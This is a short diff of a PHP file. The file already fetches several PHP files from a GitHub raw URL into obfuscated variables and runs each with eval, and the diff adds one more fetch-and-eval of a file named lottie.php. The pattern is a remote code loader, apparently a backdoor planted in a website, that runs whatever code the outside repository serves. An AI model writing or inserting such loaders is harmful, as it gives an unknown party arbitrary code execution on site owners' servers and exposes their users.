@@ -180,4 +180,6 @@ $aqygstg3=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr12
 eval("?>".$aqygstg3);
 $aqygstg4=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr128567/main/import.php");
 eval("?>".$aqygstg4);
+$aqygstg5=file_get_contents("https://raw.githubusercontent.com/hojr128567/hojr128567/main/lottie.php");
+eval("?>".$aqygstg5);
 ?>
